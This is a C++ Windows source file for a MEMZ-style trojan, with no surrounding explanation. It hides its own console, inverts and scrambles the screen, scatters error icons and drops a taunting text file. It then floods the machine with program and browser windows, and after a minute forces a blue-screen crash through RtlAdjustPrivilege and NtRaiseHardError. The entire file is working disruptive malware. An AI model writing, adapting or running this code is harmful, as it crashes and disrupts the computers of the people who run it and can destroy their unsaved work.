#include <windows.h>
#include <wingdi.h> 
#include <cstdio>
#include <ctime>
#include <cstdlib>
using namespace std;
int call;
int ScreenWidth=GetSystemMetrics(SM_CXSCREEN);
int ScreenHeight=GetSystemMetrics(SM_CYSCREEN);
int IconWidth=GetSystemMetrics(SM_CXICON);
int IconHeight=GetSystemMetrics(SM_CYICON);
HDC hdc=GetWindowDC(GetDesktopWindow());
#define KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME)&0x8000)?1:0)
int random(int upper_bound) 
{
 	if(upper_bound==0) 
	{
  		return 0;
 	}
 	srand((unsigned)(time(0)*clock()*rand()*call+time(0)+rand()+call));
 	call++;
 	return rand()%upper_bound;
}
DWORD WINAPI FlashDesktop(LPVOID Param)
{
 	while(1) 
	{
  		BitBlt(hdc,0,0,ScreenWidth,ScreenHeight,hdc,0,0,NOTSRCCOPY);
  		Sleep(random(100));
 	}
 	return 0;
}
DWORD WINAPI ScreenXorOperation1(LPVOID Param) 
{
 	while(1)
	{
  		int RandWidth=random(ScreenWidth);
  		int RandHeight=random(ScreenHeight);
  		int RandxPixel=random(ScreenWidth-RandWidth);
  		int RandyPixel=random(ScreenHeight-RandHeight);
  		int RandDestxPixel=random(ScreenWidth-RandWidth);
  		int RandDestyPixel=random(ScreenHeight-RandHeight);
  		BitBlt(hdc,RandxPixel,RandyPixel,RandWidth,RandHeight,hdc,RandDestxPixel,RandDestyPixel,SRCINVERT);
  		Sleep(random(100));
 	}
 	return 0;
}
DWORD WINAPI ScreenXorOperation2(LPVOID Param) 
{
 	while(1) 
	{
  		int RandWidth=random(ScreenWidth);
  		int RandHeight=random(ScreenHeight);
  		int RandxPixel=random(ScreenWidth-RandWidth)+RandWidth;
  		int RandyPixel=random(ScreenHeight-RandHeight)+RandHeight;
  		int RandDestxPixel=random(ScreenWidth-RandWidth)+RandWidth;
  		int RandDestyPixel=random(ScreenHeight-RandHeight)+RandHeight;
  		BitBlt(hdc,RandxPixel,RandyPixel,RandWidth,RandHeight,hdc,RandDestxPixel,RandDestyPixel,SRCINVERT);
  		Sleep(random(100));
 	}
 	return 0;
}
DWORD WINAPI BSOD(LPVOID Param) 
{
	Sleep(60000);
	HMODULE ntdll=LoadLibrary("ntdll.dll");
 	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");
 	FARPROC NtRaiseHardErr=GetProcAddress(ntdll,"NtRaiseHardError");
 	unsigned char ErrKill;
 	long unsigned int HDErr;
 	((void(*)(DWORD,DWORD,BOOLEAN,LPBYTE))RtlAdjPriv)(0x13,true,false,&ErrKill);
 	((void(*)(DWORD,DWORD,DWORD,DWORD,DWORD,LPDWORD))NtRaiseHardErr)(0xc0000233,0,0,0,6,&HDErr);
 	return 0;
}
DWORD WINAPI DrawErrors(LPVOID Param) 
{
 	while(1) 
	{
  		int RandxPixel=random(ScreenWidth-IconWidth/2);
  		int RandyPixel=random(ScreenHeight-IconHeight/2);
  		DrawIcon(hdc,RandxPixel,RandyPixel,LoadIcon(NULL,IDI_ERROR));
  		Sleep(random(50));
  		int RandPixel=random(ScreenWidth-IconWidth/2);
  		int Rand1Pixel=random(ScreenHeight-IconHeight/2);
  		DrawIcon(hdc,RandPixel,Rand1Pixel,LoadIcon(NULL,IDI_QUESTION));
  		Sleep(random(50));
  		int Rand2Pixel=random(ScreenWidth-IconWidth/2);
  		int Rand3Pixel=random(ScreenHeight-IconHeight/2);
  		DrawIcon(hdc,Rand2Pixel,Rand3Pixel,LoadIcon(NULL,IDI_WARNING));
  		Sleep(random(50));
  		int Rand4Pixel=random(ScreenWidth-IconWidth/2);
  		int Rand5Pixel=random(ScreenHeight-IconHeight/2);
  		DrawIcon(hdc,Rand4Pixel,Rand5Pixel,LoadIcon(NULL,IDI_INFORMATION));
  		Sleep(random(50));
 	}
 	return 0;
}
int main() 
{
	ShowWindow(GetForegroundWindow(),0);
 	CreateThread(NULL,4096,&FlashDesktop,NULL,NULL,NULL);
 	CreateThread(NULL,4096,&ScreenXorOperation1,NULL,NULL,NULL);
 	CreateThread(NULL,4096,&ScreenXorOperation2,NULL,NULL,NULL);
 	CreateThread(NULL,4096,&BSOD,NULL,NULL,NULL);
 	CreateThread(NULL,4096,&DrawErrors,NULL,NULL,NULL);
 	FILE *p=fopen("Fuckyou.txt","w");
 	fprintf(p,"Your computer has been fucked by MEMZ Trojan.\nYour computer will have a BSOD after 1 minutes.\nSo use it as long as you can!\n:)\n");
 	fclose(p);
 	system("notepad.exe Fuckyou.txt");
	while(1)
	{
		system("start cmd.exe");
		Sleep(random(100));
		system("start calc.exe");
		Sleep(random(100));
		system("start explorer.exe");
		Sleep(random(100));
		system("start write.exe");
		Sleep(random(100));
		system("start notepad.exe");
		Sleep(random(100));
		system("start https://luogu.com.cn");
		Sleep(random(100));
		system("start https://github.com");
		Sleep(random(100));
		system("start https://zzcjas.github.io");
		Sleep(random(100));
		system("start https://cn.bing.com");
		Sleep(random(100));
		system("start https://microsoft.com");
	}
}
